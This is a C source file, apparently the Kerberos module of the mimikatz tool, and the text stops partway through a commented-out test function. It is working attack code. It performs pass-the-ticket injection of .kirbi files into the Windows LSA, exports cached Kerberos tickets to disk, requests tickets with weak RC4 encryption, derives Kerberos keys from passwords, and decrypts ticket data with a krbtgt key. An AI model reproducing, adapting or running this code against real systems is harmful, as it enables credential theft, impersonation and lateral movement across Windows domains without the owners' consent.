/*	Benjamin DELPY `gentilkiwi`
	blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_kerberos.h"

STRING	kerberosPackageName = {8, 9, MICROSOFT_KERBEROS_NAME_A};
DWORD	g_AuthenticationPackageId_Kerberos = 0;
BOOL	g_isAuthPackageKerberos = FALSE;
HANDLE	g_hLSA = NULL;

const KUHL_M_C kuhl_m_c_kerberos[] = {
	{kuhl_m_kerberos_ptt,		L"ptt",			L"Pass-the-ticket [NT 6]"},
};

const KUHL_M kuhl_m_kerberos = {
	L"kerberos",	L"Kerberos package module",	L"",
	ARRAYSIZE(kuhl_m_c_kerberos), kuhl_m_c_kerberos, kuhl_m_kerberos_init, kuhl_m_kerberos_clean
};

NTSTATUS kuhl_m_kerberos_init()
{
	NTSTATUS status = LsaConnectUntrusted(&g_hLSA);
	if(NT_SUCCESS(status))
	{
		status = LsaLookupAuthenticationPackage(g_hLSA, &kerberosPackageName, &g_AuthenticationPackageId_Kerberos);
		g_isAuthPackageKerberos = NT_SUCCESS(status);
	}
	return status;
}

NTSTATUS kuhl_m_kerberos_clean()
{
	return LsaDeregisterLogonProcess(g_hLSA);
}

NTSTATUS LsaCallKerberosPackage(PVOID ProtocolSubmitBuffer, ULONG SubmitBufferLength, PVOID *ProtocolReturnBuffer, PULONG ReturnBufferLength, PNTSTATUS ProtocolStatus)
{
	NTSTATUS status = STATUS_HANDLE_NO_LONGER_VALID;
	if(g_hLSA && g_isAuthPackageKerberos)
		status = LsaCallAuthenticationPackage(g_hLSA, g_AuthenticationPackageId_Kerberos, ProtocolSubmitBuffer, SubmitBufferLength, ProtocolReturnBuffer, ReturnBufferLength, ProtocolStatus);
	return status;
}

NTSTATUS kuhl_m_kerberos_ptt(int argc, wchar_t * argv[])
{
	int i;
	for(i = 0; i < argc; i++)
	{
		if(PathIsDirectory(argv[i]))
		{
			kprintf(L"* Directory: \'%s\'\n", argv[i]);
			kull_m_file_Find(argv[i], L"*.kirbi", FALSE, 0, FALSE, FALSE, kuhl_m_kerberos_ptt_directory, NULL);
		}
		else kuhl_m_kerberos_ptt_directory(0, argv[i], PathFindFileName(argv[i]), NULL);
	}
	return STATUS_SUCCESS;
}

BOOL CALLBACK kuhl_m_kerberos_ptt_directory(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg)
{
	if(fullpath)
	{
		kprintf(L"\n* File: \'%s\': ", fullpath);
		kuhl_m_kerberos_ptt_file(fullpath);
	}
	return FALSE;
}

void kuhl_m_kerberos_ptt_file(PCWCHAR filename)
{
	PBYTE fileData;
	DWORD fileSize;
	NTSTATUS status;
	if(kull_m_file_readData(filename, &fileData, &fileSize))
	{
		status = kuhl_m_kerberos_ptt_data(fileData, fileSize);
		if(NT_SUCCESS(status))
			kprintf(L"OK\n");
		else
			PRINT_ERROR(L"LsaCallKerberosPackage %08x\n", status);
		LocalFree(fileData);
	}
	else PRINT_ERROR_AUTO(L"kull_m_file_readData");
}

NTSTATUS kuhl_m_kerberos_ptt_data(PVOID data, DWORD dataSize)
{
	NTSTATUS status = STATUS_MEMORY_NOT_ALLOCATED, packageStatus;
	DWORD submitSize, responseSize;
	PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
	PVOID dumPtr;
	
	submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + dataSize;
	if(pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST) LocalAlloc(LPTR, submitSize))
	{
		pKerbSubmit->MessageType = KerbSubmitTicketMessage;
		pKerbSubmit->KerbCredSize = dataSize;
		pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
		RtlCopyMemory((PBYTE) pKerbSubmit + pKerbSubmit->KerbCredOffset, data, dataSize);

		status = LsaCallKerberosPackage(pKerbSubmit, submitSize, &dumPtr, &responseSize, &packageStatus);
		if(NT_SUCCESS(status))
		{
			status = packageStatus;
			if(!NT_SUCCESS(status))
				PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage / Package : %08x\n", status);
		}
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage : %08x\n", status);

		LocalFree(pKerbSubmit);
	}
	return status;
}

NTSTATUS kuhl_m_kerberos_purge(int argc, wchar_t * argv[])
{
	NTSTATUS status, packageStatus;
	KERB_PURGE_TKT_CACHE_REQUEST kerbPurgeRequest = {KerbPurgeTicketCacheMessage, {0, 0}, {0, 0, NULL}, {0, 0, NULL}};
	PVOID dumPtr;
	DWORD responseSize;

	status = LsaCallKerberosPackage(&kerbPurgeRequest, sizeof(KERB_PURGE_TKT_CACHE_REQUEST), &dumPtr, &responseSize, &packageStatus);
	if(NT_SUCCESS(status))
	{
		if(NT_SUCCESS(packageStatus))
			kprintf(L"Ticket(s) purge for current session is OK\n");
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbPurgeTicketCacheMessage / Package : %08x\n", packageStatus);
	}
	else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbPurgeTicketCacheMessage : %08x\n", status);

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_tgt(int argc, wchar_t * argv[])
{
	NTSTATUS status, packageStatus;
	KERB_RETRIEVE_TKT_REQUEST kerbRetrieveRequest = {KerbRetrieveTicketMessage, {0, 0}, {0, 0, NULL}, 0, 0, KERB_ETYPE_NULL, {0, 0}};
	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
	DWORD szData;
	KIWI_KERBEROS_TICKET kiwiTicket = {0};
	DWORD i;
	BOOL isNull = FALSE;

	status = LsaCallKerberosPackage(&kerbRetrieveRequest, sizeof(KERB_RETRIEVE_TKT_REQUEST), (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
	kprintf(L"Kerberos TGT of current session : ");
	if(NT_SUCCESS(status))
	{
		if(NT_SUCCESS(packageStatus))
		{
			kiwiTicket.ServiceName = pKerbRetrieveResponse->Ticket.ServiceName;
			kiwiTicket.TargetName = pKerbRetrieveResponse->Ticket.TargetName;
			kiwiTicket.ClientName = pKerbRetrieveResponse->Ticket.ClientName;
			kiwiTicket.DomainName = pKerbRetrieveResponse->Ticket.DomainName;
			kiwiTicket.TargetDomainName = pKerbRetrieveResponse->Ticket.TargetDomainName;
			kiwiTicket.AltTargetDomainName = pKerbRetrieveResponse->Ticket.AltTargetDomainName;
			kiwiTicket.TicketFlags = pKerbRetrieveResponse->Ticket.TicketFlags;
			kiwiTicket.KeyType = kiwiTicket.TicketEncType = pKerbRetrieveResponse->Ticket.SessionKey.KeyType; // TicketEncType not in response
			kiwiTicket.Key.Length = pKerbRetrieveResponse->Ticket.SessionKey.Length;
			kiwiTicket.Key.Value = pKerbRetrieveResponse->Ticket.SessionKey.Value;
			kiwiTicket.StartTime = *(PFILETIME) &pKerbRetrieveResponse->Ticket.StartTime;
			kiwiTicket.EndTime = *(PFILETIME) &pKerbRetrieveResponse->Ticket.EndTime;
			kiwiTicket.RenewUntil = *(PFILETIME) &pKerbRetrieveResponse->Ticket.RenewUntil;
			kiwiTicket.Ticket.Length = pKerbRetrieveResponse->Ticket.EncodedTicketSize;
			kiwiTicket.Ticket.Value = pKerbRetrieveResponse->Ticket.EncodedTicket;
			kuhl_m_kerberos_ticket_display(&kiwiTicket, TRUE, FALSE);
			
			for(i = 0; !isNull && (i < kiwiTicket.Key.Length); i++) // a revoir
				isNull |= !kiwiTicket.Key.Value[i];
			if(isNull)
				kprintf(L"\n\n\t** Session key is NULL! It means allowtgtsessionkey is not set to 1 **\n");

			LsaFreeReturnBuffer(pKerbRetrieveResponse);
		}
		else if(packageStatus == SEC_E_NO_CREDENTIALS)
			kprintf(L"no ticket !\n");
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveTicketMessage / Package : %08x\n", packageStatus);
	}
	else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveTicketMessage : %08x\n", status);

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_list(int argc, wchar_t * argv[])
{
	NTSTATUS status, packageStatus;
	KERB_QUERY_TKT_CACHE_REQUEST kerbCacheRequest = {KerbQueryTicketCacheExMessage, {0, 0}};
	PKERB_QUERY_TKT_CACHE_EX_RESPONSE pKerbCacheResponse;
	PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
	DWORD szData, i;
	wchar_t * filename;
	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);

	status = LsaCallKerberosPackage(&kerbCacheRequest, sizeof(KERB_QUERY_TKT_CACHE_REQUEST), (PVOID *) &pKerbCacheResponse, &szData, &packageStatus);
	if(NT_SUCCESS(status))
	{
		if(NT_SUCCESS(packageStatus))
		{
			for(i = 0; i < pKerbCacheResponse->CountOfTickets; i++)
			{
				kprintf(L"\n[%08x] - 0x%08x - %s", i, pKerbCacheResponse->Tickets[i].EncryptionType, kuhl_m_kerberos_ticket_etype(pKerbCacheResponse->Tickets[i].EncryptionType));
				kprintf(L"\n   Start/End/MaxRenew: ");
				kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].StartTime); kprintf(L" ; ");
				kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].EndTime); kprintf(L" ; ");
				kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].RenewTime);
				kprintf(L"\n   Server Name       : %wZ @ %wZ", &pKerbCacheResponse->Tickets[i].ServerName, &pKerbCacheResponse->Tickets[i].ServerRealm);
				kprintf(L"\n   Client Name       : %wZ @ %wZ", &pKerbCacheResponse->Tickets[i].ClientName, &pKerbCacheResponse->Tickets[i].ClientRealm);
				kprintf(L"\n   Flags %08x    : ", pKerbCacheResponse->Tickets[i].TicketFlags);
				kuhl_m_kerberos_ticket_displayFlags(pKerbCacheResponse->Tickets[i].TicketFlags);
			
				if(export)
				{
					szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + pKerbCacheResponse->Tickets[i].ServerName.MaximumLength;
					if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData)) // LPTR implicates KERB_ETYPE_NULL
					{
						pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
						pKerbRetrieveRequest->CacheOptions = /*KERB_RETRIEVE_TICKET_USE_CACHE_ONLY | */KERB_RETRIEVE_TICKET_AS_KERB_CRED;
						pKerbRetrieveRequest->TicketFlags = pKerbCacheResponse->Tickets[i].TicketFlags;
						pKerbRetrieveRequest->TargetName = pKerbCacheResponse->Tickets[i].ServerName;
						pKerbRetrieveRequest->TargetName.Buffer = (PWSTR) ((PBYTE) pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
						RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, pKerbCacheResponse->Tickets[i].ServerName.Buffer, pKerbRetrieveRequest->TargetName.MaximumLength);

						status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
						if(NT_SUCCESS(status))
						{
							if(NT_SUCCESS(packageStatus))
							{
								if(filename = kuhl_m_kerberos_generateFileName(i, &pKerbCacheResponse->Tickets[i], MIMIKATZ_KERBEROS_EXT))
								{
									if(kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
										kprintf(L"\n   * Saved to file     : %s", filename);
									else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
									LocalFree(filename);
								}
								LsaFreeReturnBuffer(pKerbRetrieveResponse);
							}
							else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
						}
						else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);

						LocalFree(pKerbRetrieveRequest);
					}
				}
				kprintf(L"\n");
			}
			LsaFreeReturnBuffer(pKerbCacheResponse);
		}
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbQueryTicketCacheEx2Message / Package : %08x\n", packageStatus);
	}
	else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbQueryTicketCacheEx2Message : %08x\n", status);

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_ask(int argc, wchar_t * argv[])
{
	NTSTATUS status, packageStatus;
	PWCHAR filename = NULL, ticketname = NULL;
	PCWCHAR szTarget;
	PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
	KIWI_KERBEROS_TICKET ticket = {0};
	DWORD szData;
	USHORT dwTarget;
	BOOL isExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL), isTkt = kull_m_string_args_byName(argc, argv, L"tkt", NULL, NULL), isNoCache = kull_m_string_args_byName(argc, argv, L"nocache", NULL, NULL);

	if(kull_m_string_args_byName(argc, argv, L"target", &szTarget, NULL))
	{
		dwTarget = (USHORT) ((wcslen(szTarget) + 1) * sizeof(wchar_t));

		szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
		if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData))
		{
			pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
			pKerbRetrieveRequest->CacheOptions = isNoCache ? KERB_RETRIEVE_TICKET_DONT_USE_CACHE : KERB_RETRIEVE_TICKET_DEFAULT;
			pKerbRetrieveRequest->EncryptionType = kull_m_string_args_byName(argc, argv, L"rc4", NULL, NULL) ? KERB_ETYPE_RC4_HMAC_NT : kull_m_string_args_byName(argc, argv, L"des", NULL, NULL) ? KERB_ETYPE_DES3_CBC_MD5 : kull_m_string_args_byName(argc, argv, L"aes256", NULL, NULL) ? KERB_ETYPE_AES256_CTS_HMAC_SHA1_96 : kull_m_string_args_byName(argc, argv, L"aes128", NULL, NULL) ? KERB_ETYPE_AES128_CTS_HMAC_SHA1_96 : KERB_ETYPE_DEFAULT;
			pKerbRetrieveRequest->TargetName.Length = dwTarget - sizeof(wchar_t);
			pKerbRetrieveRequest->TargetName.MaximumLength  = dwTarget;
			pKerbRetrieveRequest->TargetName.Buffer = (PWSTR) ((PBYTE) pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
			RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, szTarget, pKerbRetrieveRequest->TargetName.MaximumLength);
			kprintf(L"Asking for: %wZ\n", &pKerbRetrieveRequest->TargetName);

			status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
			if(NT_SUCCESS(status))
			{
				if(NT_SUCCESS(packageStatus))
				{
					ticket.ServiceName = pKerbRetrieveResponse->Ticket.ServiceName;
					ticket.DomainName = pKerbRetrieveResponse->Ticket.DomainName;
					ticket.TargetName = pKerbRetrieveResponse->Ticket.TargetName;
					ticket.TargetDomainName = pKerbRetrieveResponse->Ticket.TargetDomainName;
					ticket.ClientName = pKerbRetrieveResponse->Ticket.ClientName;
					ticket.AltTargetDomainName = pKerbRetrieveResponse->Ticket.AltTargetDomainName;

					ticket.StartTime = *(PFILETIME) &pKerbRetrieveResponse->Ticket.StartTime;
					ticket.EndTime = *(PFILETIME) &pKerbRetrieveResponse->Ticket.EndTime;
					ticket.RenewUntil = *(PFILETIME) &pKerbRetrieveResponse->Ticket.RenewUntil;

					ticket.KeyType = ticket.TicketEncType = pKerbRetrieveResponse->Ticket.SessionKey.KeyType;
					ticket.Key.Length = pKerbRetrieveResponse->Ticket.SessionKey.Length;
					ticket.Key.Value = pKerbRetrieveResponse->Ticket.SessionKey.Value;

					ticket.TicketFlags = pKerbRetrieveResponse->Ticket.TicketFlags;
					ticket.Ticket.Length = pKerbRetrieveResponse->Ticket.EncodedTicketSize;
					ticket.Ticket.Value = pKerbRetrieveResponse->Ticket.EncodedTicket;

					kprintf(L"   * Ticket Encryption Type & kvno not representative at screen\n");
					if(isNoCache && isExport)
					kprintf(L"   * NoCache: exported ticket may vary with informations at screen\n");
					kuhl_m_kerberos_ticket_display(&ticket, TRUE, FALSE);
					kprintf(L"\n");

					if(isTkt)
						if(ticketname = kuhl_m_kerberos_generateFileName_short(&ticket, L"tkt"))
						{
							if(kull_m_file_writeData(ticketname, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
								kprintf(L"\n   * TKT to file       : %s", ticketname);
							else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
							LocalFree(ticketname);
						}
					if(isExport)
						filename = kuhl_m_kerberos_generateFileName_short(&ticket, MIMIKATZ_KERBEROS_EXT);

					LsaFreeReturnBuffer(pKerbRetrieveResponse);

					if(isExport)
					{
						pKerbRetrieveRequest->CacheOptions |= KERB_RETRIEVE_TICKET_AS_KERB_CRED;
						status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
						if(NT_SUCCESS(status))
						{
							if(NT_SUCCESS(packageStatus))
							{
								if(kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
										kprintf(L"\n   * KiRBi to file     : %s", filename);
								else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
								LsaFreeReturnBuffer(pKerbRetrieveResponse);
							}
							else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
						}
						else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);
					}
					if(filename)
						LocalFree(filename);
				}
				else if(packageStatus == STATUS_NO_TRUST_SAM_ACCOUNT)
					PRINT_ERROR(L"\'%wZ\' Kerberos name not found!\n", &pKerbRetrieveRequest->TargetName);
				else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
			}
			else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);

			LocalFree(pKerbRetrieveRequest);
		}
	}
	else PRINT_ERROR(L"At least /target argument is required (eg: /target:cifs/server.lab.local)\n");
	return STATUS_SUCCESS;
}

wchar_t * kuhl_m_kerberos_generateFileName(const DWORD index, PKERB_TICKET_CACHE_INFO_EX ticket, LPCWSTR ext)
{
	wchar_t * buffer;
	size_t charCount = 0x1000;
	
	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
	{
		if(swprintf_s(buffer, charCount, L"%u-%08x-%wZ@%wZ-%wZ.%s", index, ticket->TicketFlags, &ticket->ClientName, &ticket->ServerName, &ticket->ServerRealm, ext) > 0)
			kull_m_file_cleanFilename(buffer);
		else
			buffer = (wchar_t *) LocalFree(buffer);
	}
	return buffer;
}

wchar_t * kuhl_m_kerberos_generateFileName_short(PKIWI_KERBEROS_TICKET ticket, LPCWSTR ext)
{
	wchar_t * buffer;
	size_t charCount = 0x1000;
	BOOL isLong = kuhl_m_kerberos_ticket_isLongFilename(ticket);

	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
	{
		if(isLong)
			isLong = swprintf_s(buffer, charCount, L"%08x-%wZ@%wZ-%wZ.%s", ticket->TicketFlags, &ticket->ClientName->Names[0], &ticket->ServiceName->Names[0], &ticket->ServiceName->Names[1], ext) > 0;
		else
			isLong = swprintf_s(buffer, charCount, L"%08x-noname.%s", ticket->TicketFlags, ext) > 0;
		
		if(isLong)
			kull_m_file_cleanFilename(buffer);
		else
			buffer = (wchar_t *) LocalFree(buffer);
	}
	return buffer;
}

NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD keySize, LPCVOID data, DWORD dataSize, LPVOID *output, DWORD *outputSize, BOOL encrypt)
{
	NTSTATUS status;
	PKERB_ECRYPT pCSystem;
	PVOID pContext;
	DWORD modulo;

	status = CDLocateCSystem(eType, &pCSystem);
	if(NT_SUCCESS(status))
	{
		status = pCSystem->Initialize(key, keySize, keyUsage, &pContext);
		if(NT_SUCCESS(status))
		{
			*outputSize = dataSize;
			if(encrypt)
			{
				if(modulo = *outputSize % pCSystem->BlockSize)
					*outputSize += pCSystem->BlockSize - modulo;
				*outputSize += pCSystem->HeaderSize;
			}
			if(*output = LocalAlloc(LPTR, *outputSize))
			{
				status = encrypt ? pCSystem->Encrypt(pContext, data, dataSize, *output, outputSize) : pCSystem->Decrypt(pContext, data, dataSize, *output, outputSize);
				if(!NT_SUCCESS(status))
					LocalFree(*output);
			}
			pCSystem->Finish(&pContext);
		}
	}
	return status;
}

NTSTATUS kuhl_m_kerberos_hash_data_raw(LONG keyType, PCUNICODE_STRING pString, PCUNICODE_STRING pSalt, DWORD count, PBYTE *buffer, DWORD *dwBuffer)
{
	PKERB_ECRYPT pCSystem;
	NTSTATUS status = CDLocateCSystem(keyType, &pCSystem);
	if(NT_SUCCESS(status))
	{
		if(*buffer = (PBYTE) LocalAlloc(LPTR, pCSystem->KeySize))
		{
			*dwBuffer = pCSystem->KeySize;
			status = (MIMIKATZ_NT_MAJOR_VERSION < 6) ? pCSystem->HashPassword_NT5(pString, *buffer) : pCSystem->HashPassword_NT6(pString, pSalt, count, *buffer);
			if(!NT_SUCCESS(status))
			{
				*buffer = (PBYTE) LocalFree(*buffer);
				PRINT_ERROR(L"HashPassword : %08x\n", status);
			}
		}
	}
	else PRINT_ERROR(L"CDLocateCSystem : %08x\n", status);
	return status;
}

NTSTATUS kuhl_m_kerberos_hash_data(LONG keyType, PCUNICODE_STRING pString, PCUNICODE_STRING pSalt, DWORD count)
{
	PBYTE buffer;
	DWORD dwBuffer;
	NTSTATUS status = kuhl_m_kerberos_hash_data_raw(keyType, pString, pSalt, count, &buffer, &dwBuffer);
	if(NT_SUCCESS(status))
	{
		kprintf(L"\t* %s ", kuhl_m_kerberos_ticket_etype(keyType));
		kull_m_string_wprintf_hex(buffer, dwBuffer, 0);
		kprintf(L"\n");
		LocalFree(buffer);
	}
	return status;
}

NTSTATUS kuhl_m_kerberos_hash(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	PCWCHAR szCount, szPassword = NULL, szUsername = NULL, szDomain = NULL;
	UNICODE_STRING uPassword, uUsername, uDomain, uSalt = {0, 0, NULL}, uPasswordWithSalt = {0, 0, NULL};
	PUNICODE_STRING pString;
	DWORD count = 4096, i;
	LONG kerbType[] = {KERB_ETYPE_RC4_HMAC_NT, KERB_ETYPE_AES128_CTS_HMAC_SHA1_96, KERB_ETYPE_AES256_CTS_HMAC_SHA1_96, KERB_ETYPE_DES_CBC_MD5};
	
	kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL);
	kull_m_string_args_byName(argc, argv, L"user", &szUsername, NULL);
	kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL);
	if(kull_m_string_args_byName(argc, argv, L"count", &szCount, NULL))
		count = wcstoul(szCount, NULL, 0);

	RtlInitUnicodeString(&uPassword, szPassword);
	RtlInitUnicodeString(&uUsername, szUsername);
	RtlInitUnicodeString(&uDomain, szDomain);

	RtlUpcaseUnicodeString(&uDomain, &uDomain, FALSE);
	//RtlDowncaseUnicodeString(&uUsername, &uUsername, FALSE);
	//if(uUsername.Length >= sizeof(wchar_t))
	//	uUsername.Buffer[0] = RtlUpcaseUnicodeChar(uUsername.Buffer[0]);

	uSalt.MaximumLength = uUsername.Length + uDomain.Length + sizeof(wchar_t);
	if(uSalt.Buffer = (PWSTR) LocalAlloc(LPTR, uSalt.MaximumLength))
	{
		RtlAppendUnicodeStringToString(&uSalt, &uDomain);
		RtlAppendUnicodeStringToString(&uSalt, &uUsername);

		uPasswordWithSalt.MaximumLength = uPassword.Length + uSalt.Length + sizeof(wchar_t);
		if(uPasswordWithSalt.Buffer = (PWSTR) LocalAlloc(LPTR, uPasswordWithSalt.MaximumLength))
		{
			RtlAppendUnicodeStringToString(&uPasswordWithSalt, &uPassword);
			RtlAppendUnicodeStringToString(&uPasswordWithSalt, &uSalt);

			for(i = 0; i < ARRAYSIZE(kerbType); i++)
			{
				pString = (kerbType[i] != KERB_ETYPE_DES_CBC_MD5) ? &uPassword : &uPasswordWithSalt;
				status = kuhl_m_kerberos_hash_data(kerbType[i], pString, &uSalt, count);
			}
			LocalFree(uPasswordWithSalt.Buffer);
		}
		LocalFree(uSalt.Buffer);
	}
	return STATUS_SUCCESS;
}

#if defined(KERBEROS_TOOLS)
NTSTATUS kuhl_m_kerberos_decode(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	BYTE key[AES_256_KEY_LENGTH]; // max len
	PCWCHAR szKey = NULL, szIn, szOut, szOffset, szSize;
	PBYTE encData, decData;
	DWORD keyType, keyLen, encSize, decSize, offset = 0, size = 0;

	if(kull_m_string_args_byName(argc, argv, L"rc4", &szKey, NULL))
	{
		keyType = KERB_ETYPE_RC4_HMAC_NT;
		keyLen = LM_NTLM_HASH_LENGTH;
	}
	else if(kull_m_string_args_byName(argc, argv, L"aes128", &szKey, NULL))
	{
		keyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
		keyLen = AES_128_KEY_LENGTH;
	}
	else if(kull_m_string_args_byName(argc, argv, L"aes256", &szKey, NULL))
	{
		keyType = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
		keyLen = AES_256_KEY_LENGTH;
	}
	else if(kull_m_string_args_byName(argc, argv, L"des", &szKey, NULL))
	{
		keyType = KERB_ETYPE_DES_CBC_MD5;
		keyLen = 8;
	}
	
	if(szKey)
	{
		kprintf(L"Key is OK (%08x - %u)\n", keyType, keyLen);
		if(kull_m_string_args_byName(argc, argv, L"in", &szIn, NULL))
		{
			kull_m_string_args_byName(argc, argv, L"out", &szOut, L"out.kirbi");
			if(kull_m_file_readData(szIn, &encData, &encSize))
			{
				if(kull_m_string_args_byName(argc, argv, L"offset", &szOffset, NULL) && kull_m_string_args_byName(argc, argv, L"size", &szSize, NULL))
				{
					offset = wcstoul(szOffset, NULL, 0);
					size = wcstoul(szSize, NULL, 0);
				}
				
				if(kull_m_string_stringToHex(szKey, key, keyLen))												
				{
					status = kuhl_m_kerberos_encrypt(keyType, KRB_KEY_USAGE_AS_REP_TGS_REP, key, keyLen, encData + offset, offset ? size : encSize, (LPVOID *) &decData, &decSize, FALSE);
					if(NT_SUCCESS(status))
					{
						if(kull_m_file_writeData(szOut, decData, decSize))
							kprintf(L"DEC data saved to file! (%s)\n", szOut);
						else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
						LocalFree(decData);
					}
					else PRINT_ERROR(L"kuhl_m_kerberos_encrypt - DEC (0x%08x)\n", status);
				}
				else PRINT_ERROR(L"Krbtgt key size length must be 32 (16 bytes)\n");
				LocalFree(encData);
			}
			else PRINT_ERROR_AUTO(L"kull_m_file_readData");
		}
		else PRINT_ERROR(L"arg \'in\' missing\n");
	}
	else PRINT_ERROR(L"arg \'rc4\' or \'aes128\' or \'aes256\' missing\n");
	return STATUS_SUCCESS;
}

//NTSTATUS kuhl_m_kerberos_test(int argc, wchar_t * argv[])
//{
//	NTSTATUS status, packageStatus;
//	
//	KERB_CHANGEPASSWORD_REQUEST kerbChangePasswordRequest;
//	PBYTE kerbChangePasswordRequestBuffer;
//
//	DWORD size, responseSize = 1024, offset = sizeof(KERB_CHANGEPASSWORD_REQUEST);
//	BYTE dumPtr[1024];
//
//	RtlZeroMemory(&kerbChangePasswordRequest, sizeof(KERB_CHANGEPASSWORD_REQUEST));
//
//	kerbChangePasswordRequest.MessageType = KerbChangePasswordMessage;
//	RtlInitUnicodeString(&kerbChangePasswordRequest.DomainName, L"chocolate.local");
//	RtlInitUnicodeString(&kerbChangePasswordRequest.AccountName, L"testme");
//	RtlInitUnicodeString(&kerbChangePasswordRequest.OldPassword, L"---");
//	RtlInitUnicodeString(&kerbChangePasswordRequest.NewPassword, L"t4waza1234/");
//	kerbChangePasswordRequest.Impersonating = FALSE;
//
//	size = kerbChangePasswordRequest.DomainName.Length + kerbChangePasswordRequest.AccountName.Length + kerbChangePasswordRequest.OldPassword.Length + kerbChangePasswordRequest.NewPassword.Length;
//	if(kerbChangePasswordRequestBuffer = (PBYTE) LocalAlloc(LPTR, offset + size))
//	{
//		RtlCopyMemory(kerbChangePasswordRequestBuffer + offset, kerbChangePasswordRequest.DomainName.Buffer, kerbChangePasswordRequest.DomainName.Length);
//		kerbChangePasswordRequest.DomainName.Buffer = (PWCHAR) offset;
//		offset += kerbChangePasswordRequest.DomainName.Length;
//
//		RtlCopyMemory(kerbChangePasswordRequestBuffer + offset, kerbChangePasswordRequest.AccountName.Buffer, kerbChangePasswordRequest.AccountName.Length);
//		kerbChangePasswordRequest.AccountName.Buffer = (PWCHAR) offset;
//		offset += kerbChangePasswordRequest.AccountName.Length;
//
//		RtlCopyMemory(kerbChangePasswordRequestBuffer + offset, kerbChangePasswordRequest.OldPassword.Buffer, kerbChangePasswordRequest.OldPassword.Length);
//		kerbChangePasswordRequest.OldPassword.Buffer = (PWCHAR) offset;
//		offset += kerbChangePasswordRequest.OldPassword.Length;
//
//		RtlCopyMemory(kerbChangePasswordRequestBuffer + offset, kerbChangePasswordRequest.NewPassword.Buffer, kerbChangePasswordRequest.NewPassword.Length);
//		kerbChangePasswordRequest.NewPassword.Buffer = (PWCHAR) offset;
//		offset += kerbChangePasswordRequest.NewPassword.Length;
//
//
